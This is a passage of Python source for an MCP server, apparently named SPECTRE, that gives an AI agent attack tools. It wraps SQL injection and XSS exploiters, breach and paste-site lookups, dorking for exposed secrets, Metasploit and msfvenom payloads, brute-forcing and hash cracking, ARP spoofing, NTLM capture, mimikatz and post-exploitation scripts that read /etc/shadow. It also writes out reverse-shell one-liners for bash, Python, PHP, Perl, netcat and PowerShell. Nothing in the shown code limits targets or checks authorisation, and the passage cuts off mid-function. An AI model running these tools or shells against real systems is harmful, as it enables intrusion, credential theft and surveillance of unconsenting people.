        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=120)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_crawl(url: str, depth: int = 1, mode: str = "fetcher") -> str:
    """A simple crawler that follows links on the same domain up to a certain depth.
    depth: max depth to follow (default 1)."""
    if err := require(url): return err
    u = san(url)
    m = san(mode).lower()
    script = (
        "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
        "from urllib.parse import urljoin, urlparse\n"
        "import json\n"
        "try:\n"
        f"    base_domain = urlparse('{u}').netloc\n"
        "    to_visit = [('{u}', 0)]\n"
        "    visited = set()\n"
        "    results = []\n"
        f"    mode_str = '{m}'\n"
        "    while to_visit:\n"
        "        curr_url, curr_depth = to_visit.pop(0)\n"
        "        if curr_url in visited or curr_depth > {depth}:\n"
        "            continue\n"
        "        visited.add(curr_url)\n"
        "        if mode_str == 'dynamic': page = DynamicFetcher.fetch(curr_url, headless=True)\n"
        "        elif mode_str == 'stealth': page = StealthyFetcher.fetch(curr_url, headless=True)\n"
        "        else: page = Fetcher.get(curr_url)\n"
        "        results.append({'url': curr_url, 'status': getattr(page, 'status', getattr(page, 'status_code', '?')), 'title': page.css('title::text').get()})\n"
        "        if curr_depth < {depth}:\n"
        "            for link in page.css('a::attr(href)').getall():\n"
        "                full_link = urljoin(curr_url, link)\n"
        "                if urlparse(full_link).netloc == base_domain:\n"
        "                    to_visit.append((full_link, curr_depth + 1))\n"
        "    print(json.dumps(results, indent=2))\n"
        "except Exception as e:\n"
        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=300)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_smart_content(url: str, mode: str = "fetcher") -> str:
    """Automatically extracts the main content (article/text) from a page without selectors."""
    if err := require(url): return err
    u = san(url)
    m = san(mode).lower()
    script = (
        "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
        "try:\n"
        f"    if '{m}' == 'dynamic': page = DynamicFetcher.fetch('{u}', headless=True)\n"
        f"    elif '{m}' == 'stealth': page = StealthyFetcher.fetch('{u}', headless=True)\n"
        f"    else: page = Fetcher.get('{u}')\n"
        "    # Using Scrapling's internal cleaning and text extraction logic\n"
        "    print(page.text)\n"
        "except Exception as e:\n"
        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=120)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_session_fetch(url: str, cookies: dict = None, mode: str = "fetcher") -> str:
    """Fetch a page using a persistent session (for authenticated or stateful scraping).
    cookies: dictionary of cookies to use."""
    if err := require(url): return err
    u = san(url)
    m = san(mode).lower()
    c_str = json.dumps(cookies) if cookies else "None"
    script = (
        "from scrapling import Session\n"
        "try:\n"
        f"    session = Session(mode='{m}')\n"
        f"    if {c_str}: session.set_cookies({c_str})\n"
        f"    page = session.get('{u}')\n"
        f"    print(f'STATUS: {{page.status if hasattr(page, \"status\") else page.status_code}}')\n"
        "    print(page.text)\n"
        "except Exception as e:\n"
        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=120)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_screenshot(url: str, output_path: str = "/tmp/screenshot.png") -> str:
    """Take a screenshot of a webpage using Scrapling's StealthyFetcher."""
    if err := require(url): return err
    u = san(url)
    o = san(output_path)
    script = (
        "from scrapling.fetchers import StealthyFetcher\n"
        "try:\n"
        f"    page = StealthyFetcher.fetch('{u}', headless=True, network_idle=True)\n"
        f"    page.page.screenshot(path='{o}')\n"
        f"    print(f'Screenshot saved to: {o}')\n"
        "except Exception as e:\n"
        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=120)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_bypass_check(url: str) -> str:
    """Check if Scrapling can bypass anti-bot protections on a given URL."""
    if err := require(url): return err
    u = san(url)
    script = (
        "from scrapling.fetchers import StealthyFetcher\n"
        "import json\n"
        "try:\n"
        f"    page = StealthyFetcher.fetch('{u}', headless=True, network_idle=True)\n"
        "    res = {\n"
        "        'status': page.status,\n"
        "        'title': page.css('title::text').get(),\n"
        "        'is_cloudflare': 'cloudflare' in page.text.lower(),\n"
        "        'content_length': len(page.text)\n"
        "    }\n"
        "    print(json.dumps(res, indent=2))\n"
        "except Exception as e:\n"
        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=120)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_cli(command: str) -> str:
    """Run an arbitrary Scrapling CLI command (e.g. 'extract https://example.com output.md')."""
    if err := require(command): return err
    return run(f"/opt/mcp-venv/bin/scrapling {san(command)}", timeout=300)


@mcp.tool()
def sqlmap_scan(target: str, flags: str = "--batch --level=2 --risk=2") -> str:
    """SQLmap — automated SQL injection detection and exploitation."""
    if err := require(target): return err
    return run(f"sqlmap -u '{san(target)}' {san(flags)}", timeout=300)


@mcp.tool()
def wpscan_scan(target: str, flags: str = "--enumerate u,vp,vt,dbe") -> str:
    """WPScan — WordPress vulnerability scanner."""
    if err := require(target): return err
    return run(
        f"wpscan --url {san(target)} {san(flags)} --no-banner 2>/dev/null",
        timeout=300,
    )


@mcp.tool()
def xssstrike_scan(url: str, options: str = "") -> str:
    """XSStrike — advanced XSS detection and exploitation."""
    if err := require(url): return err
    return run_argv(["xssstrike", "-u", san(url)] + split_opts(options))


@mcp.tool()
def commix_scan(url: str, options: str = "--batch") -> str:
    """Commix — command injection exploiter."""
    if err := require(url): return err
    return run_argv(["commix", "--url", san(url)] + split_opts(options), timeout=600)


@mcp.tool()
def curl_request(url: str, options: str = "-sv --max-time 30") -> str:
    """Send a raw curl HTTP request and return the full response."""
    if err := require(url): return err
    return run_argv(["curl"] + split_opts(options) + [san(url)], timeout=60)


# ─── DARK WEB & LEAK INTELLIGENCE ────────────────────────────────────────────

@mcp.tool()
def onionsearch(query: str) -> str:
    """Search dark web .onion sites via public search engines."""
    if err := require(query): return err
    q = san(query)
    return run(
        f"{PYTHON} -m onionsearch '{q}' 2>/dev/null || "
        f"curl -s --socks5-hostname 127.0.0.1:9050 "
        f"'http://juhanurmihxlp77nkivfkfngberpertqj5pbhhyqkqfaomtrfptkbspid.onion/search/?q={q}' 2>/dev/null "
        r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
        r"links=re.findall(r'http[s]?://[a-z0-9.]+\.onion[^\s\"<>]*', d); "
        r"[print(l) for l in set(links[:20])]\"",
        timeout=120,
    )


@mcp.tool()
def paste_search(query: str) -> str:
    """Search Pastebin and paste sites for leaked credentials/data."""
    if err := require(query): return err
    q = san(query).replace(" ", "+")
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://psbdmp.ws/api/v3/search/{q}' 2>/dev/null | python3 -m json.tool | head -50 && "
        f"curl -sA 'SPECTRE/1.0' 'https://www.google.com/search?q=site:pastebin.com+\"{q}\"' 2>/dev/null "
        r"| grep -oP 'pastebin\.com/[a-zA-Z0-9]+' | sort -u | head -10",
        timeout=30,
    )


@mcp.tool()
def breach_search(email: str) -> str:
    """Search multiple breach databases for an email address."""
    if err := require(email): return err
    e = san(email)
    return run(
        f"{PYTHON} -m h8mail -t {e} 2>/dev/null && "
        f"curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/{e}' 2>/dev/null | python3 -m json.tool",
        timeout=120,
    )


@mcp.tool()
def dehashed_search(query: str, field: str = "email") -> str:
    """Search DeHashed breach database by email, username, IP, or name."""
    if err := require(query): return err
    q = san(query)
    return run(
        f"curl -s -G 'https://api.dehashed.com/search' --data-urlencode 'query={q}' "
        f"-H 'Accept: application/json' 2>/dev/null | python3 -m json.tool "
        f"|| echo 'DeHashed requires API credentials — set DEHASHED_EMAIL and DEHASHED_API_KEY'",
        timeout=30,
    )


@mcp.tool()
def pastebin_monitor(keyword: str) -> str:
    """Monitor Pastebin for recent pastes containing a keyword."""
    if err := require(keyword): return err
    return run(
        f"curl -s 'https://psbdmp.ws/api/v3/search/{san(keyword)}' 2>/dev/null "
        f"| python3 -m json.tool | head -100",
        timeout=30,
    )


# ─── GEOLOCATION & PHYSICAL INTELLIGENCE ─────────────────────────────────────

@mcp.tool()
def exif_extract(file_path: str) -> str:
    """Extract EXIF metadata from an image — GPS coords, camera, timestamps."""
    if err := require(file_path): return err
    return run(f"exiftool '{san(file_path)}' 2>/dev/null")


@mcp.tool()
def exif_url(url: str) -> str:
    """Download an image from a URL and extract EXIF/GPS data."""
    if err := require(url): return err
    u = san(url)
    return run(
        f"wget -q -O /tmp/spectre_img '{u}' 2>/dev/null && exiftool /tmp/spectre_img && rm -f /tmp/spectre_img",
        timeout=30,
    )


@mcp.tool()
def metadata_extract(file_path: str) -> str:
    """Extract metadata from PDF, DOCX, XLSX, images — author, software, dates."""
    if err := require(file_path): return err
    f = san(file_path)
    return run(f"exiftool '{f}' 2>/dev/null && mat2 --show '{f}' 2>/dev/null")


@mcp.tool()
def metagoofil_scan(domain: str, file_types: str = "pdf,docx,xlsx,pptx") -> str:
    """Metagoofil — download public documents from a domain and extract metadata."""
    if err := require(domain): return err
    d = san(domain)
    ft = san(file_types)
    return run(
        f"python3 /opt/metagoofil/metagoofil.py -d {d} -t {ft} -l 10 -o /tmp/metagoofil_{d} 2>/dev/null",
        timeout=300,
    )


@mcp.tool()
def gps_to_address(lat: str, lon: str) -> str:
    """Reverse geocode GPS coordinates to a street address."""
    if err := require(lat, lon): return err
    return run(
        f"curl -s 'https://nominatim.openstreetmap.org/reverse?lat={san(lat)}&lon={san(lon)}&format=json' "
        f"-H 'User-Agent: SPECTRE/1.0' | python3 -m json.tool",
        timeout=30,
    )


@mcp.tool()
def address_to_gps(address: str) -> str:
    """Geocode a street address to GPS coordinates."""
    if err := require(address): return err
    a = san(address).replace(" ", "+")
    return run(
        f"curl -s 'https://nominatim.openstreetmap.org/search?q={a}&format=json&limit=3' "
        f"-H 'User-Agent: SPECTRE/1.0' | python3 -m json.tool",
        timeout=30,
    )


# ─── GOOGLE DORKING & DOCUMENT INTELLIGENCE ──────────────────────────────────

@mcp.tool()
def google_dork(query: str) -> str:
    """Google dorking — advanced search operator queries for exposed data."""
    if err := require(query): return err
    q = san(query).replace(" ", "+")
    return run(
        f"curl -sA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' "
        f"'https://www.google.com/search?q={q}&num=20' 2>/dev/null "
        r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
        r"urls=re.findall(r'(?:href=\"/url\?q=)(https?://[^&\"]+)', d); "
        r"[print(u) for u in urls if 'google.com' not in u][:15]\"",
        timeout=30,
    )


@mcp.tool()
def dork_exposed_files(domain: str) -> str:
    """Find exposed sensitive files via Google dorks on a target domain."""
    if err := require(domain): return err
    d = san(domain)
    dorks = [
        f"site:{d} ext:pdf OR ext:docx OR ext:xlsx OR ext:csv",
        f"site:{d} ext:sql OR ext:db OR ext:backup",
        f"site:{d} intitle:\"index of\" OR inurl:backup",
        f"site:{d} inurl:admin OR inurl:login OR inurl:dashboard",
        f"site:{d} \"password\" OR \"api_key\" filetype:log",
        f"site:{d} inurl:.git OR inurl:.env OR inurl:config.php",
    ]
    results = []
    for dork in dorks:
        q = dork.replace(" ", "+")
        results.append(f"\n=== {dork} ===")
        results.append(
            run(
                f"curl -sA 'Mozilla/5.0' 'https://www.google.com/search?q={q}' 2>/dev/null "
                r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
                r"urls=re.findall(r'(?:href=\"/url\?q=)(https?://[^&\"]+)', d); "
        r"for u in [u for u in urls if 'google.com' not in u][:5]: print(u)\"",
                timeout=15,
            )
        )
    return "\n".join(results)


# ─── CRYPTOCURRENCY & BLOCKCHAIN ─────────────────────────────────────────────

@mcp.tool()
def btc_address(address: str) -> str:
    """Bitcoin address intelligence — balance, transactions, total received/sent."""
    if err := require(address): return err
    a = san(address)
    return run(
        f"curl -s 'https://blockchain.info/address/{a}?format=json' "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
        r"print(f'Balance: {d[\"final_balance\"]/1e8:.8f} BTC\n"
        r"Total Received: {d[\"total_received\"]/1e8:.8f} BTC\n"
        r"Total Sent: {d[\"total_sent\"]/1e8:.8f} BTC\n"
        r"Transactions: {d[\"n_tx\"]}')\"",
        timeout=30,
    )


@mcp.tool()
def eth_address(address: str, api_key: str = "") -> str:
    """Ethereum address intelligence — balance, token holdings, recent transactions."""
    if err := require(address): return err
    a = san(address)
    ak = san(api_key) if api_key else ETHERSCAN_KEY
    key_param = f"&apikey={ak}" if ak else ""
    return run(
        f"curl -s 'https://api.etherscan.io/api?module=account&action=balance&address={a}&tag=latest{key_param}' "
        f"| python3 -m json.tool && "
        f"curl -s 'https://api.etherscan.io/api?module=account&action=txlist&address={a}"
        f"&startblock=0&endblock=99999999&page=1&offset=10&sort=desc{key_param}' "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
        r"[print(t['hash'][:16]+'...', int(t['value'])/1e18, 'ETH from', t['from'][:10]+'...') "
        r"for t in d.get('result',[])[:10] if isinstance(d.get('result'),list)]\"",
        timeout=30,
    )


@mcp.tool()
def crypto_tx(txhash: str, chain: str = "btc") -> str:
    """Look up a cryptocurrency transaction by hash. chain: btc or eth."""
    if err := require(txhash): return err
    tx = san(txhash)
    c = san(chain).lower()
    if c == "btc":
        return run(
            f"curl -s 'https://blockchain.info/rawtx/{tx}' "
            r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
            r"print(f'Hash: {d[\"hash\"]}\nSize: {d[\"size\"]} bytes\nFee: {d[\"fee\"]/1e8:.8f} BTC\n"
            r"Inputs: {len(d[\"inputs\"])}\nOutputs: {len(d[\"out\"])}')\"",
            timeout=30,
        )
    return run(
        f"curl -s 'https://api.etherscan.io/api?module=proxy&action=eth_getTransactionByHash&txhash={tx}' "
        f"| python3 -m json.tool",
        timeout=30,
    )


# ─── COMPANY & BUSINESS INTELLIGENCE ─────────────────────────────────────────

@mcp.tool()
def company_search(name: str) -> str:
    """Search for company info — registration, executives, jurisdiction, filings."""
    if err := require(name): return err
    n = san(name).replace(" ", "+")
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://api.opencorporates.com/v0.4/companies/search?q={n}&per_page=10' "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
        r"[print(c['company']['name'],'\n  Jurisdiction:', c['company']['jurisdiction_code'],"
        r"'\n  Status:', c['company']['current_status'],"
        r"'\n  Number:', c['company']['company_number']) for c in d['results']['companies'][:5]]\"",
        timeout=30,
    )


@mcp.tool()
def linkedin_company(company: str) -> str:
    """Find LinkedIn company page and employee details via Google dork."""
    if err := require(company): return err
    c = san(company)
    return run(
        f"curl -sA 'Mozilla/5.0' 'https://www.google.com/search?q=site:linkedin.com/company+\"{c}\"' 2>/dev/null "
        r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
        r"links=re.findall(r'https://www\.linkedin\.com/company/[a-zA-Z0-9\-]+', d); "
        r"[print(l) for l in set(links[:10])]\"",
        timeout=30,
    )


@mcp.tool()
def sec_filing(company: str) -> str:
    """Search SEC EDGAR for company filings — 10-K, 10-Q, 8-K documents."""
    if err := require(company): return err
    c = san(company).replace(" ", "+")
    return run(
        f"curl -s 'https://efts.sec.gov/LATEST/search-index?q={c}&dateRange=custom&startdt=2020-01-01&forms=10-K,10-Q,8-K' "
        f"| python3 -m json.tool | head -50",
        timeout=30,
    )


@mcp.tool()
def dns_history(domain: str) -> str:
    """DNS history — find past IP addresses a domain has pointed to."""
    if err := require(domain): return err
    d = san(domain)
    return run(
        f"curl -s 'https://securitytrails.com/domain/{d}/history/a' 2>/dev/null "
        r"| grep -oP '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b' | sort -u | head -20 "
        f"|| curl -s 'https://api.hackertarget.com/hostsearch/?q={d}' 2>/dev/null | head -30",
        timeout=30,
    )


@mcp.tool()
def reverse_ip(ip: str) -> str:
    """Reverse IP lookup — find all domains hosted on an IP."""
    if err := require(ip): return err
    return run(
        f"curl -s 'https://api.hackertarget.com/reverseiplookup/?q={san(ip)}' 2>/dev/null | head -30",
        timeout=30,
    )


@mcp.tool()
def mx_finder(domain: str) -> str:
    """Find mail servers and guess email format for a company."""
    if err := require(domain): return err
    d = san(domain)
    return run(
        f"dig {d} MX +short && "
        f"curl -s 'https://api.hunter.io/v2/domain-search?domain={d}&limit=10' 2>/dev/null "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); data=d.get('data',{}); "
        r"print('Format:', data.get('pattern')); "
        r"[print(e['value'], e['confidence'],'%') for e in data.get('emails',[])[:10]]\" "
        f"|| echo 'Hunter.io API key needed for email format discovery'",
        timeout=30,
    )


# ─── EXPLOIT & VULNERABILITY INTELLIGENCE ────────────────────────────────────

@mcp.tool()
def searchsploit_search(query: str) -> str:
    """Search Exploit-DB for known exploits by software name or version."""
    if err := require(query): return err
    return run(f"searchsploit {san(query)}")


@mcp.tool()
def searchsploit_get(exploit_id: str, options: str = "") -> str:
    """View the source of an Exploit-DB exploit by its numeric ID."""
    if err := require(exploit_id): return err
    return run_argv(["searchsploit", "-x", san(exploit_id)] + split_opts(options))


@mcp.tool()
def cve_lookup(cve_id: str) -> str:
    """Look up a CVE — CVSS score, description, affected software, PoC links."""
    if err := require(cve_id): return err
    c = san(cve_id)
    return run(
        f"curl -s 'https://cveawg.mitre.org/api/cve/{c}' | python3 -m json.tool | head -100 && "
        f"curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={c}' "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); vuln=d['vulnerabilities'][0]['cve']; "
        r"print('\nCVSS:', vuln.get('metrics',{}).get('cvssMetricV31',[{}])[0].get('cvssData',{}).get('baseScore','N/A')); "
        r"print('Desc:', vuln['descriptions'][0]['value'][:500])\"",
        timeout=30,
    )


@mcp.tool()
def exploit_suggest(service: str, version: str = "") -> str:
    """Get exploit suggestions for a service/version from multiple databases."""
    if err := require(service): return err
    query = f"{san(service)} {san(version)}".strip()
    q_url = query.replace(" ", "%20")
    return run(
        f"searchsploit {query} && "
        f"curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={q_url}&resultsPerPage=10' "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
        r"[print(v['cve']['id'], v['cve']['descriptions'][0]['value'][:150]) "
        r"for v in d.get('vulnerabilities',[])]\"",
        timeout=30,
    )


# ─── AUTOMATED OSINT FRAMEWORKS ──────────────────────────────────────────────

@mcp.tool()
def spiderfoot_scan(target: str, modules: str = "") -> str:
    """SpiderFoot — automated OSINT correlation across 200+ data sources."""
    if err := require(target): return err
    t = san(target)
    mods = f"-m {san(modules)}" if modules else ""
    return run(
        f"cd /opt/spiderfoot && {PYTHON} sf.py -s {t} {mods} -q 2>/dev/null | head -100",
        timeout=600,
    )


@mcp.tool()
def recon_ng_query(workspace: str = "default", module: str = "", options: str = "") -> str:
    """Recon-ng framework query with a specific module.
    e.g. module='recon/domains-hosts/hackertarget'"""
    if err := require(module): return err
    return run(
        f"recon-ng -w {san(workspace)} -m {san(module)} {san(options)} -x 'run' 2>/dev/null | tail -50",
        timeout=180,
    )


# ─── NETWORK SERVICE ENUMERATION ─────────────────────────────────────────────

@mcp.tool()
def enum4linux_scan(target: str, options: str = "-a") -> str:
    """Enumerate Windows/Samba — users, shares, groups, OS, password policy."""
    if err := require(target): return err
    return run_argv(["enum4linux"] + split_opts(options) + [san(target)], timeout=180)


@mcp.tool()
def smb_enum(target: str) -> str:
    """SMB enumeration — shares, users, OS version via smbclient + nmap scripts."""
    if err := require(target): return err
    t = san(target)
    return run(
        f"smbclient -L //{t} -N 2>/dev/null && "
        f"nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 {t} 2>/dev/null"
    )


@mcp.tool()
def snmp_enum(target: str, community: str = "public") -> str:
    """SNMP enumeration — device info, interfaces, running processes."""
    if err := require(target): return err
    t = san(target)
    c = san(community)
    return run(
        f"snmpwalk -v2c -c {c} {t} 2>/dev/null | head -50 "
        f"|| snmpwalk -v1 -c {c} {t} 2>/dev/null | head -50"
    )


@mcp.tool()
def ldap_enum(target: str, base_dn: str = "") -> str:
    """LDAP enumeration — users, groups, domain info."""
    if err := require(target): return err
    return run(
        f"nmap --script ldap-search,ldap-rootdse -p 389,636 {san(target)} 2>/dev/null",
        timeout=60,
    )


@mcp.tool()
def ftp_enum(target: str) -> str:
    """FTP enumeration — anonymous access, banner, version."""
    if err := require(target): return err
    return run(
        f"nmap --script ftp-anon,ftp-banner,ftp-syst -p 21 {san(target)} 2>/dev/null"
    )


@mcp.tool()
def ssh_enum(target: str) -> str:
    """SSH enumeration — algorithms, host keys, auth methods."""
    if err := require(target): return err
    return run(
        f"nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p 22 {san(target)} 2>/dev/null"
    )


# ═════════════════════════════════════════════════════════════════════════════
# ██████╗ ████████╗     PENTEST MODULE
# ██╔══██╗╚══██╔══╝
# ██████╔╝   ██║
# ██╔═══╝    ██║
# ██║        ██║
# ╚═╝        ╚═╝
# ═════════════════════════════════════════════════════════════════════════════

# ─── EXPLOITATION ─────────────────────────────────────────────────────────────

@mcp.tool()
def msfconsole_run(commands: str, options: str = "") -> str:
    """Run Metasploit Framework commands non-interactively.
    Separate multiple commands with semicolons."""
    if err := require(commands): return err
    return run_argv(
        ["msfconsole", "-q", "-x", commands + "; exit"] + split_opts(options),
        timeout=120,
    )


@mcp.tool()
def msfvenom_generate(options: str) -> str:
    """Generate shellcode or payloads with msfvenom.
    Example: -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe"""
    if err := require(options): return err
    return run_argv(["msfvenom"] + split_opts(options))


# ─── PASSWORD ATTACKS ─────────────────────────────────────────────────────────

@mcp.tool()
def hydra_attack(target: str, options: str = "") -> str:
    """Hydra brute-force login attack.
    Example options: -l admin -P /usr/share/wordlists/rockyou.txt ssh://target"""
    if err := require(target): return err
    return run_argv(["hydra"] + split_opts(options) + [san(target)], timeout=900)


@mcp.tool()
def john_crack(hashfile: str, options: str = "--wordlist=/usr/share/wordlists/rockyou.txt") -> str:
    """Crack password hashes with John the Ripper from a hash file."""
    if err := require(hashfile): return err
    return run_argv(["john", san(hashfile)] + split_opts(options), timeout=900)


@mcp.tool()
def hashcat_crack(hashfile: str, options: str = "-a 0 -m 0 /usr/share/wordlists/rockyou.txt") -> str:
    """Crack hashes with Hashcat.
    Common -m values: 0=MD5  1000=NTLM  1800=sha512crypt"""
    if err := require(hashfile): return err
    return run_argv(["hashcat", san(hashfile)] + split_opts(options), timeout=900)


@mcp.tool()
def hash_identify(hash_value: str) -> str:
    """Identify the type of a password hash."""
    if err := require(hash_value): return err
    proc = subprocess.run(
        ["hash-identifier"], input=hash_value + "\n\n",
        capture_output=True, text=True, timeout=10,
    )
    return (proc.stdout + proc.stderr).strip()


@mcp.tool()
def crunch_wordlist(min_len: str = "4", max_len: str = "8",
                    charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
                    options: str = "") -> str:
    """Generate a custom wordlist with crunch using given length bounds and charset."""
    return run_argv(["crunch", san(min_len), san(max_len), san(charset)] + split_opts(options), timeout=60)


# ─── NETWORK ATTACKS ──────────────────────────────────────────────────────────

@mcp.tool()
def arpspoof_run(target: str, gateway: str, interface: str = "eth0", options: str = "") -> str:
    """ARP poisoning MITM attack between a target and its gateway."""
    if err := require(target, gateway): return err
    return run_argv(
        ["arpspoof", "-i", san(interface), "-t", san(target), san(gateway)] + split_opts(options),
        timeout=30,
    )


@mcp.tool()
def tcpdump_capture(interface: str = "eth0", options: str = "-c 100") -> str:
    """Capture network packets with tcpdump on a given interface."""
    return run_argv(["tcpdump", "-i", san(interface)] + split_opts(options), timeout=60)


@mcp.tool()
def netcat_run(options: str) -> str:
    """Netcat — port scanning, banner grabbing, or reverse shells.
    Example: -nv 10.0.0.1 80"""
    if err := require(options): return err
    return run_argv(["nc"] + split_opts(options), timeout=30)


@mcp.tool()
def responder_run(interface: str = "eth0", options: str = "-wrf") -> str:
    """Responder — capture NTLM hashes via LLMNR/NBT-NS poisoning."""
    return run_argv(["responder", "-I", san(interface)] + split_opts(options), timeout=60)


@mcp.tool()
def smbclient_run(target: str, options: str = "-L") -> str:
    """List or access SMB shares on a Windows/Samba target."""
    if err := require(target): return err
    return run_argv(["smbclient"] + split_opts(options) + [san(target)], timeout=30)


@mcp.tool()
def crackmapexec_run(target: str, protocol: str = "smb", options: str = "") -> str:
    """CrackMapExec — SMB/WinRM/SSH/LDAP enumeration and credential testing."""
    if err := require(target): return err
    return run_argv(["crackmapexec", san(protocol), san(target)] + split_opts(options), timeout=120)


@mcp.tool()
def impacket_run(tool: str, options: str = "") -> str:
    """Run any Impacket script by name.
    Examples: impacket-secretsdump  impacket-psexec  impacket-GetUserSPNs"""
    if err := require(tool): return err
    return run_argv([san(tool)] + split_opts(options), timeout=120)


# ─── POST EXPLOITATION ────────────────────────────────────────────────────────

@mcp.tool()
def linpeas_run(options: str = "") -> str:
    """Run LinPEAS Linux privilege escalation checker.
    Download first: download_file('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', '/tmp/')"""
    return run_argv(["bash", "/tmp/linpeas.sh"] + split_opts(options), timeout=300)


@mcp.tool()
def linux_enum() -> str:
    """Full Linux post-exploitation enumeration — id, users, SUID, cron, env, history."""
    cmds = [
        "id", "whoami", "uname -a", "cat /etc/os-release",
        "cat /etc/passwd", "cat /etc/shadow 2>/dev/null",
        "ps aux", "netstat -tulpn 2>/dev/null || ss -tulpn",
        "find / -perm -4000 -type f 2>/dev/null",
        "cat /etc/crontab", "env", "sudo -l 2>/dev/null",
        "ls -la /home", "cat ~/.bash_history 2>/dev/null | head -50",
    ]
    results = []
    for cmd in cmds:
        results.append(f"\n=== {cmd} ===")
        results.append(run_argv(["bash", "-c", cmd], timeout=15))
    return "\n".join(results)


@mcp.tool()
def mimikatz_run(commands: str = "sekurlsa::logonpasswords") -> str:
    """Run mimikatz (if available) or provide Metasploit kiwi module instructions."""
    check = run_argv(["which", "mimikatz"], timeout=5)
    if "not found" in check or "ERROR" in check:
        return "[INFO] mimikatz not installed natively. Use msfconsole_run with: load kiwi; creds_all"
    return run_argv(["mimikatz", san(commands), "exit"], timeout=60)


# ─── WIRELESS ─────────────────────────────────────────────────────────────────

@mcp.tool()
def aircrack_run(options: str) -> str:
    """Crack WEP/WPA wireless passwords from a packet capture file.
    Example options: -w /usr/share/wordlists/rockyou.txt capture.cap"""
    if err := require(options): return err
    return run_argv(["aircrack-ng"] + split_opts(options), timeout=600)


@mcp.tool()
def airodump_run(interface: str = "wlan0", options: str = "") -> str:
    """Capture wireless packets and list nearby access points."""
    return run_argv(["airodump-ng"] + split_opts(options) + [san(interface)], timeout=30)


# ─── UTILITIES ────────────────────────────────────────────────────────────────

@mcp.tool()
def download_file(url: str, destination: str = "/tmp/") -> str:
    """Download a file from a URL into the container filesystem."""
    if err := require(url): return err
    return run_argv(["wget", "-P", san(destination), san(url)], timeout=60)


@mcp.tool()
def generate_reverse_shell(lhost: str, lport: str = "4444",
                            shell_type: str = "bash") -> str:
    """Generate a reverse shell one-liner.
    shell_type: bash | python | php | perl | nc | powershell"""
    if err := require(lhost): return err
    lh = san(lhost)
    lp = san(lport)
    shells = {
        "bash":
            f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1",
        "python":
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
            f"s.connect((\"{lh}\",{lp}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "php":
            f"php -r '$sock=fsockopen(\"{lh}\",{lp});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl":
            f"perl -e 'use Socket;$i=\"{lh}\";$p={lp};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "nc":
            f"nc -e /bin/sh {lh} {lp}",
        "powershell":
            f"$client=New-Object System.Net.Sockets.TCPClient(\"{lh}\",{lp});"
            f"$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
            f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
            f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback=(iex $data 2>&1|Out-String);"
            f"$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";"
            f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};$client.Close()",
    }
    if shell_type not in shells:
